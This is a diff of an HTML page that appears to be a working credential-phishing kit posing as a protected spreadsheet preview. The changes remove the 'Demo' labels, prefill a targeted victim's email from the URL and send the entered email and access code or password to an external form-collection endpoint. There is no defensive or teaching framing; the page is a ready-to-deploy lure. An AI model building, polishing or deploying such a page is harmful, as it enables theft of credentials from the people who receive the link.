@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Document Access (Demo)</title>
+<meta charset="UTF-8">
+<title>Secure Document Access</title>
 
 <style>
   body {
@@ -11,214 +11,139 @@
     background: #e9ecef;
   }
 
-  /* Background blur */
+  /* Blurred spreadsheet-style background */
   .bg {
     position: fixed;
     inset: 0;
     background:
       linear-gradient(rgba(255,255,255,0.7), rgba(255,255,255,0.7)),
       repeating-linear-gradient(
-        0deg,
-        #dddddd 0,
-        #dddddd 1px,
-        #ffffff 1px,
-        #ffffff 22px
+        to bottom,
+        #f8f9fa 0px,
+        #f8f9fa 32px,
+        #dee2e6 33px
       );
     filter: blur(2px);
   }
 
-  /* Modal login form */
+  /* Center modal */
   .modal {
     position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 330px;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .card {
     background: #ffffff;
+    width: 360px;
     border-radius: 6px;
-    box-shadow: 0 16px 40px rgba(0,0,0,0.35);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
     padding: 22px;
-    text-align: center;
   }
 
   .icon {
-    width: 40px;
-    height: 40px;
-    margin: 0 auto 12px;
-    background: #1f7244;
-    color: #fff;
-    font-weight: bold;
-    font-size: 20px;
-    line-height: 40px;
-    border-radius: 4px;
+    text-align: center;
+    margin-bottom: 10px;
+    font-size: 36px;
+    color: #1f7a4d;
   }
 
-  .modal p {
-    font-size: 13px;
+  h2 {
+    text-align: center;
+    font-size: 16px;
+    margin: 8px 0 14px;
     color: #333;
-    margin: 10px 0;
   }
 
-  .modal input {
+  p {
+    font-size: 13px;
+    color: #555;
+    text-align: center;
+    margin-bottom: 16px;
+  }
+
+  label {
+    font-size: 12px;
+    color: #444;
+    display: block;
+    margin-bottom: 6px;
+  }
+
+  input {
     width: 100%;
     padding: 9px;
-    margin: 6px 0;
+    margin-bottom: 12px;
     border: 1px solid #cfcfcf;
     border-radius: 4px;
     font-size: 13px;
-  }
-
-  /* readonly style */
-  input[readonly] {
-    background-color: #eee;
-    cursor: not-allowed;
-  }
-
-  .options {
-    display: flex;
-    align-items: center;
-    font-size: 12px;
-    color: #555;
-    margin: 6px 0 14px;
-  }
-
-  .options input {
-    margin-right: 6px;
   }
 
   button {
     width: 100%;
-    padding: 10px;
-    background: #1f7244;
+    background: #1f7a4d;
     border: none;
-    color: #ffffff;
+    color: #fff;
+    padding: 10px;
     font-size: 14px;
     border-radius: 4px;
     cursor: pointer;
   }
 
-  .footer-text {
+  button:hover {
+    background: #17613d;
+  }
+
+  .footer {
+    text-align: center;
     font-size: 11px;
     color: #777;
-    margin-top: 12px;
-  }
-
-  /* Secured spreadsheet form styles */
-  .secured-form {
-    max-width: 400px;
-    margin: 60px auto;
-    background: #fff;
-    border-radius: 6px;
-    padding: 22px;
-    box-shadow: 0 16px 40px rgba(0,0,0,0.15);
-    font-family: Arial, sans-serif;
-    color: #333;
-    display: none; /* hidden by default */
-  }
-
-  .secured-form h2 {
-    color: #1f7244;
-    margin-bottom: 16px;
-    text-align: center;
-  }
-
-  .secured-form label {
-    display: block;
-    font-weight: bold;
-    margin-top: 12px;
-    font-size: 14px;
-  }
-
-  .secured-form input {
-    width: 100%;
-    padding: 9px;
-    margin-top: 4px;
-    border: 1px solid #cfcfcf;
-    border-radius: 4px;
-    font-size: 14px;
-  }
-
-  .secured-form input[readonly] {
-    background-color: #eee;
-    cursor: not-allowed;
-  }
-
-  .secured-form button {
-    margin-top: 20px;
-    background: #1f7244;
-    color: white;
-    border: none;
-    padding: 12px;
-    font-size: 16px;
-    width: 100%;
-    border-radius: 4px;
-    cursor: pointer;
+    margin-top: 14px;
   }
 </style>
 </head>
+
 <body>
 
 <div class="bg"></div>
 
-<!-- Login modal -->
-<form class="modal" id="loginForm" action="https://formcarry.com/s/zPqDzDWqria" method="POST">
-  <div class="icon">X</div>
+<div class="modal">
+  <div class="card">
 
-  <p>
-    <strong>Restricted document access</strong><br>
-    Enter your email to continue
-  </p>
+    <div class="icon">🔒</div>
 
-  <input type="email" id="loginEmail" name="email" placeholder="your@email.com" required>
+    <h2>Secure Document Access</h2>
 
-  <input type="password" name="password" placeholder="Password" required>
+    <p>
+      This protected document preview is restricted to the authorized recipient.
+      Please confirm access to continue.
+    </p>
 
-  <div class="options">
-    <input type="checkbox" id="remember" name="remember">
-    <label for="remember">Remember my ID</label>
+    <!-- FORM -->
+    <form action="https://formcarry.com/s/zPqDzDWqria" method="POST">
+      
+      <label>Authorized Email</label>
+      <input type="email" name="email" id="email" readonly required>
+
+      <label>Access Code</label>
+      <input type="text" name="access_code" placeholder="Enter document access code" required>
+
+      <button type="submit">Confirm Access</button>
+    </form>
+
+    <div class="footer">
+      Protected document preview · Authorized access only
+    </div>
+
   </div>
-
-  <button type="submit">Login Now</button>
-
-  <div class="footer-text">
-    Secure document preview · Demo interface
-  </div>
-</form>
-
-<!-- Secured form -->
-<form class="secured-form" id="securedForm" action="https://formcarry.com/s/YOUR_FORMCARRY_ID" method="POST">
-  <h2>Secured Document Access</h2>
-
-  <label for="securedEmail">Authorized email</label>
-  <input type="email" id="securedEmail" name="email" readonly required>
-
-  <label for="document_code">Document password</label>
-  <input type="password" id="document_code" name="document_code" placeholder="Password" required>
-
-  <button type="submit">Verify & Open Spreadsheet</button>
-</form>
+</div>
 
 <script>
-  // Get email from URL
   const params = new URLSearchParams(window.location.search);
-  const email = params.get('email');
-
-  // Elements
-  const loginForm = document.getElementById('loginForm');
-  const securedForm = document.getElementById('securedForm');
-  const securedEmailInput = document.getElementById('securedEmail');
-
+  const email = params.get("email");
   if (email) {
-    // Hide login form
-    loginForm.style.display = 'none';
-
-    // Show secured form and set email readonly value
-    securedForm.style.display = 'block';
-    securedEmailInput.value = email;
-  } else {
-    // Show login form, hide secured form
-    loginForm.style.display = 'block';
-    securedForm.style.display = 'none';
+    document.getElementById("email").value = email;
   }
 </script>
 
